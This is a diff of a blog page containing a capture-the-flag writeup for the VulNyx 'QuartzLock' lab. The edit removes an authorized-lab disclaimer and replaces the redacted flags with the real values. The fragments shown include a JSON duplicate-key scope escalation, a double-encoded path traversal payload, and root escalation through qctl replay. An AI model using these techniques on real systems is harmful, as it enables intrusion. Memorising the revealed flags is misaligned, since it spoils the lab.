@@ -29,12 +29,11 @@
     document.documentElement.setAttribute("data-theme", theme);
   })();
 </script>
-<title>QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student</title>
+<title>QuartzLock VulNyx: Writeup | 4mN3s14 | Blog</title>
 <meta
   name="description"
   content="
-     Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.
-Target Summary Item Value Target 192.168.100.143 Primary …
+    QuartzLock VulNyx: Writeup Target Summary Item Value Target 192.168.100.143 Primary hostname quartz.nyx Additional hosts api.nyx, enroll.nyx Initial execution …
   
   ">
 
@@ -51,22 +50,20 @@ Target Summary Item Value Target 192.168.100.143 Primary …
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
-<meta property="og:title" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student">
-<meta property="og:description" content=" Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.
-Target Summary Item Value Target 192.168.100.143 Primary …">
+<meta property="og:title" content="QuartzLock VulNyx: Writeup | 4mN3s14 | Blog">
+<meta property="og:description" content="QuartzLock VulNyx: Writeup Target Summary Item Value Target 192.168.100.143 Primary hostname quartz.nyx Additional hosts api.nyx, enroll.nyx Initial execution …">
 <meta property="og:url" content="http://localhost:1313/myblog/posts/quart_lock/">
-<meta property="og:site_name" content="4mN3s14 | CTF Player &amp; Student"><meta property="og:image" content="/myblog/images/logo.png">
-  <meta property="og:image:alt" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student">
+<meta property="og:site_name" content="4mN3s14 | Blog"><meta property="og:image" content="/myblog/images/logo.png">
+  <meta property="og:image:alt" content="QuartzLock VulNyx: Writeup | 4mN3s14 | Blog">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-06-02T00:00:00Z">
   <meta
     property="article:modified_time"
     content="2026-06-02T00:00:00Z"><meta property="article:section" content="misc"><meta property="article:tag" content="misc"><meta property="article:tag" content="vulnyx"><meta property="article:tag" content="labs">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student">
-<meta name="twitter:description" content=" Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.
-Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitter:image" content="/myblog/images/logo.png">
-  <meta name="twitter:image:alt" content="QuartzLock VulNyx: Writeup | 4mN3s14 | CTF Player &amp; Student"><meta name="twitter:site" content="@J0n4n1">
+<meta name="twitter:title" content="QuartzLock VulNyx: Writeup | 4mN3s14 | Blog">
+<meta name="twitter:description" content="QuartzLock VulNyx: Writeup Target Summary Item Value Target 192.168.100.143 Primary hostname quartz.nyx Additional hosts api.nyx, enroll.nyx Initial execution …"><meta name="twitter:image" content="/myblog/images/logo.png">
+  <meta name="twitter:image:alt" content="QuartzLock VulNyx: Writeup | 4mN3s14 | Blog"><meta name="twitter:site" content="@J0n4n1">
   <meta name="twitter:creator" content="@J0n4n1">
 
 
@@ -88,7 +85,7 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
 
   
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","email":"kagimujkar@gmail.com","name":"4mN3s14 | CTF Player \u0026 Student","sameAs":["https://github.com/John-Jkar","https://twitter.com/J0n4n1"]},"dateModified":"2026-06-02T00:00:00Z","datePublished":"2026-06-02T00:00:00Z","description":" Authorized lab target only. This walkthrough was reproduced against 192.168.100.143 on June 11, 2026.\nTarget Summary Item Value Target 192.168.100.143 Primary …","headline":"QuartzLock VulNyx: Writeup","inLanguage":"en-US","keywords":["misc","vulnyx","labs"],"mainEntityOfPage":{"@id":"http://localhost:1313/myblog/posts/quart_lock/","@type":"WebPage"},"publisher":{"@type":"Organization","name":"4mN3s14 | CTF Player \u0026 Student","url":"http://localhost:1313/myblog/"},"timeRequired":"PT7M","url":"http://localhost:1313/myblog/posts/quart_lock/","wordCount":1404}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","email":"kagimujkar@gmail.com","name":"4mN3s14 | Blog","sameAs":["https://github.com/John-Jkar","https://twitter.com/J0n4n1"]},"dateModified":"2026-06-02T00:00:00Z","datePublished":"2026-06-02T00:00:00Z","description":"QuartzLock VulNyx: Writeup Target Summary Item Value Target 192.168.100.143 Primary hostname quartz.nyx Additional hosts api.nyx, enroll.nyx Initial execution …","headline":"QuartzLock VulNyx: Writeup","inLanguage":"en-US","keywords":["misc","vulnyx","labs"],"mainEntityOfPage":{"@id":"http://localhost:1313/myblog/posts/quart_lock/","@type":"WebPage"},"publisher":{"@type":"Organization","name":"4mN3s14 | Blog","url":"http://localhost:1313/myblog/"},"timeRequired":"PT7M","url":"http://localhost:1313/myblog/posts/quart_lock/","wordCount":1388}</script>
 
 
 
@@ -219,7 +216,7 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
       rel="alternate"
       type="application/rss+xml"
       href="http://localhost:1313/myblog/index.xml"
-      title="4mN3s14 | CTF Player &amp; Student">
+      title="4mN3s14 | Blog">
   
 
 
@@ -235,8 +232,8 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
         <nav class="header-nav" role="navigation" aria-label="Main navigation">
   <div class="header-content">
     <div class="header-logo">
-      <a href="http://localhost:1313/myblog/" class="logo-link" aria-label="Home - 4mN3s14 | CTF Player &amp; Student">
-        4mN3s14 | CTF Player &amp; Student
+      <a href="http://localhost:1313/myblog/" class="logo-link" aria-label="Home - 4mN3s14 | Blog">
+        4mN3s14 | Blog
       </a>
     </div>
 
@@ -387,7 +384,7 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
             stroke-width="2"
             d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
         </svg>
-        1404 words
+        1388 words
       </span>
     
 
@@ -422,19 +419,7 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
       </header>
 
       <div class="post-content-main">
-        
-
-
-
-
-
-
-
-<blockquote class="blockquote-regular">
-  <p>Authorized lab target only. This walkthrough was reproduced against
-<code>192.168.100.143</code> on June 11, 2026.</p>
-
-</blockquote>
+        <h1 id="quartzlock-vulnyx-writeup">QuartzLock VulNyx: Writeup</h1>
 <h2 id="target-summary">Target Summary</h2>
 <table>
 	<thead>
@@ -470,11 +455,11 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
 			</tr>
 			<tr>
 					<td>User flag</td>
-					<td><code>[REDACTED]</code></td>
+					<td><code>939dedafdb8d309b2d71c4f482210672</code></td>
 			</tr>
 			<tr>
 					<td>Root flag</td>
-					<td><code>[REDACTED]</code></td>
+					<td><code>16760b5a8e71fb62499088b89ac255b5</code></td>
 			</tr>
 	</tbody>
 </table>
@@ -514,7 +499,7 @@ Target Summary Item Value Target 192.168.100.143 Primary …"><meta name="twitte
 </span></span><span style="display:flex;"><span>443/tcp  open   ssl/http   nginx 1.26.3
 </span></span></code></pre></div><p>Port 80 redirects to <code>https://quartz.nyx/</code>. The TLS certificate on port 443
 contains the additional application hostnames.</p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/01-terminal.png" alt="Nmap service scan"></p>
+<p><img src="screenshots/01-terminal.png" alt="Nmap service scan"></p>
 <h2 id="2-virtual-host-discovery">2. Virtual Host Discovery</h2>
 <p>Inspect the certificate:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client <span style="color:#ae81ff">\
@@ -525,10 +510,10 @@ contains the additional application hostnames.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DNS:quartz.nyx
 </span></span><span style="display:flex;"><span>DNS:api.nyx
 </span></span><span style="display:flex;"><span>DNS:enroll.nyx
-</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/02-terminal.png" alt="TLS SAN discovery"></p>
+</span></span></code></pre></div><p><img src="screenshots/02-terminal.png" alt="TLS SAN discovery"></p>
 <p>The primary portal confirms the device-trust theme and references API
 documentation and attestation metadata.</p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/00-portal.png" alt="QuartzLock portal"></p>
+<p><img src="screenshots/00-portal.png" alt="QuartzLock portal"></p>
 <h2 id="3-documentation-and-metadata">3. Documentation and Metadata</h2>
 <p>Retrieve the well-known metadata:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk <span style="color:#ae81ff">\
@@ -560,8 +545,8 @@ differently.</p>
 </span></span><span style="display:flex;"><span>GET  /api/v2/jobs/{id}
 </span></span></code></pre></div><p>The bundle endpoint requires <code>bundle:submit</code> or <code>probe:upload</code> and accepts
 gzip-compressed <code>.qpak</code> files for the WASI compatibility profile.</p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/03-api-docs.png" alt="API documentation"></p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/03-terminal.png" alt="Metadata and documentation output"></p>
+<p><img src="screenshots/03-api-docs.png" alt="API documentation"></p>
+<p><img src="screenshots/03-terminal.png" alt="Metadata and documentation output"></p>
 <h2 id="4-normal-enrollment">4. Normal Enrollment</h2>
 <p>A normal enrollment request receives only <code>device:enroll</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NORMAL<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{
@@ -611,7 +596,7 @@ legacy authorization parser uses the first value.</p>
 </span></span><span style="display:flex;"><span>  ]
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The JWT claims also contain both privileged scopes.</p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/04-terminal.png" alt="Duplicate-key scope escalation"></p>
+<p><img src="screenshots/04-terminal.png" alt="Duplicate-key scope escalation"></p>
 <h3 id="why-it-works">Why It Works</h3>
 <p>The request has two valid interpretations:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Canonical policy parser: last key wins  -&gt; device:enroll
@@ -671,7 +656,7 @@ format:</p>
 </span></span></span><span style="display:flex;"><span>  manifest.toml probe.wasm policy.rego sbom.json
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>tar -tzvf /tmp/worker-id.qpak
-</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/05-terminal.png" alt="qpak contents and traversal"></p>
+</span></span></code></pre></div><p><img src="screenshots/05-terminal.png" alt="qpak contents and traversal"></p>
 <h2 id="7-double-decoded-preopen-traversal">7. Double-Decoded Preopen Traversal</h2>
 <p>The malicious path is:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/var/lib/quartz/jobs/%252e%252e/%252e%252e/%252e%252e/%252e%252e/run/quartz
@@ -710,9 +695,9 @@ format:</p>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
 </span></span></code></pre></div><p>Successful command execution:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>uid=993(svc-attest) gid=1003(quartz-runner) groups=1003(quartz-runner)
-</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/06-terminal.png" alt="Command execution as svc-attest"></p>
+</span></span></code></pre></div><p><img src="screenshots/06-terminal.png" alt="Command execution as svc-attest"></p>
 <h2 id="8-command-execution-helper">8. Command Execution Helper</h2>
-<p>The included <a href="http://localhost:1313/myblog/artifacts/quartzlock/legacy_exec.sh">legacy_exec.sh</a> automates:</p>
+<p>The included <a href="legacy_exec.sh">legacy_exec.sh</a> automates:</p>
 <ol>
 <li>Creation of the legacy JSON <code>probe.wasm</code>.</li>
 <li>qpak packaging.</li>
@@ -757,7 +742,7 @@ selector <code>QL-EDGE-%</code> resolves to that asset.</p>
 </span></span></code></pre></div><p>Inspect it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -Lf caden_key-cert.pub
 </span></span></code></pre></div><p>The principal is <code>caden</code>.</p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/07-terminal.png" alt="Wildcard certificate issuance"></p>
+<p><img src="screenshots/07-terminal.png" alt="Wildcard certificate issuance"></p>
 <h2 id="10-ssh-as-caden">10. SSH as caden</h2>
 <p>Use the private key together with the signed certificate:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh <span style="color:#ae81ff">\
@@ -773,9 +758,9 @@ selector <code>QL-EDGE-%</code> resolves to that asset.</p>
 </span></span></code></pre></div><p>Result:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>uid=1001(caden) gid=1001(caden) groups=1001(caden),1002(quartz-maint)
 </span></span><span style="display:flex;"><span>quartzlock
-</span></span><span style="display:flex;"><span>[REDACTED]
+</span></span><span style="display:flex;"><span>939dedafdb8d309b2d71c4f482210672
 </span></span></code></pre></div><p>The important group is <code>quartz-maint</code>.</p>
-<p><img src="http://localhost:1313/myblog/images/quartzlock/08-terminal.png" alt="SSH access and user flag"></p>
+<p><img src="screenshots/08-terminal.png" alt="SSH access and user flag"></p>
 <h2 id="11-qctl-replay-enumeration">11. qctl Replay Enumeration</h2>
 <p>As <code>caden</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /usr/local/bin/qctl
@@ -815,10 +800,10 @@ content after the namespace overlay.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qctl replay <span style="color:#e6db74">&#34;</span>$CASE<span style="color:#e6db74">&#34;</span>
 </span></span></code></pre></div><p>Output:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
-</span></span><span style="display:flex;"><span>root flag: [REDACTED]
+</span></span><span style="display:flex;"><span>root flag: 16760b5a8e71fb62499088b89ac255b5
 </span></span></code></pre></div><p>Remove the user-controlled case:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -rf <span style="color:#e6db74">&#34;/var/lib/quartz/cases/</span>$CASE<span style="color:#e6db74">&#34;</span>
-</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/09-terminal.png" alt="Root execution and root flag"></p>
+</span></span></code></pre></div><p><img src="screenshots/09-terminal.png" alt="Root execution and root flag"></p>
 <h2 id="13-cleanup">13. Cleanup</h2>
 <p>Remove the temporary public key and certificate on the target:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">&#34;</span> ./legacy_exec.sh /bin/rm -f <span style="color:#ae81ff">\
@@ -889,14 +874,13 @@ content after the namespace overlay.</p>
 </ul>
 <h2 id="reproduction-artifacts">Reproduction Artifacts</h2>
 <ul>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/legacy_exec.sh">Automated legacy worker command helper</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/legacy-manifest.toml">Malicious qpak manifest</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/legacy-probe.json">Legacy probe JSON</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/policy.rego">Rego policy</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/sbom.json">SPDX metadata</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/quartzlock-reproduction-files.zip">Reproduction files ZIP</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/quartzlock-evidence.zip">Redacted evidence ZIP</a></li>
-<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/quartzlock-screenshots.zip">Redacted screenshots ZIP</a></li>
+<li><a href="legacy_exec.sh">Automated legacy worker command helper</a></li>
+<li><a href="qpak/legacy-manifest.toml">Malicious qpak manifest</a></li>
+<li><a href="qpak/legacy-probe.json">Legacy probe JSON</a></li>
+<li><a href="qpak/policy.rego">Rego policy</a></li>
+<li><a href="qpak/sbom.json">SPDX metadata</a></li>
+<li><a href="evidence/">Raw reproduced evidence</a></li>
+<li><a href="screenshots/">Screenshots</a></li>
 </ul>
 
       </div>
@@ -960,6 +944,14 @@ The …</span>
           </a>
         
 
+        
+          <a
+            href="http://localhost:1313/myblog/posts/fireflow/"
+            class="nav-link nav-next"
+            aria-label="Next post: FireFlow - HTB Machine Writeup">
+            <span class="nav-label">Next</span>
+            <span class="nav-title">FireFlow - HTB Machine Writeup</span>
+          </a>
         
       </nav>
     </article>
@@ -1051,7 +1043,7 @@ The …</span>
       
       2026
       
-      4mN3s14 | CTF Player &amp; Student.
+      4mN3s14 | Blog.
       
     </p>
     
